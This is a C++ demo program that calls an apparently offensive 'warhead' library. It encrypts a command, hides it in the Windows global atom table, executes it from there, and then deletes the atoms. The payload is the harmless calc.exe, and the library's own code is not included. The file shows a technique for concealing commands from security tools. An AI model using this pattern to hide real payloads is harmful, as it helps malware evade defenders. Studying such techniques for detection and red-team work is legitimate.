#include "warhead.h"
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>

int main() {
    try {
        // The command to be stored and executed
        std::wstring commandToExecute = L"calc.exe";
        std::wcout << L"Original Command: " << commandToExecute << std::endl;

        // Store the encrypted command in the Windows global Atom table
        std::wcout << L"Storing encrypted command in atoms..." << std::endl;
        std::vector<ATOM> commandAtoms = warhead::storeEncryptedCommandInAtoms(commandToExecute);

        // Display the ATOM handles for verification
        std::wcout << L"Command stored in " << commandAtoms.size() << L" atoms with handles: ";
        for (ATOM atom : commandAtoms) {
            std::wcout << atom << L" ";
        }
        std::wcout << std::endl;

        // Retrieve and decrypt the command from the atoms
        std::wcout << L"Retrieving and decrypting command..." << std::endl;
        std::wstring retrievedCommand = warhead::retrieveAndDecryptCommandFromAtoms(commandAtoms);
        std::wcout << L"Decrypted Command: " << retrievedCommand << std::endl;

        // Execute the command directly from the atoms
        std::wcout << L"Executing the command from atoms..." << std::endl;
        warhead::executeEncryptedCommandFromAtoms(commandAtoms);
        std::wcout << L"Command executed successfully." << std::endl;

        // Cleanup: delete the atoms from the table
        std::wcout << L"Deleting atoms..." << std::endl;
        warhead::deleteAtoms(commandAtoms);
        std::wcout << L"Atoms deleted." << std::endl;

    } catch (const std::exception& e) {
        std::cerr << "An error occurred: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
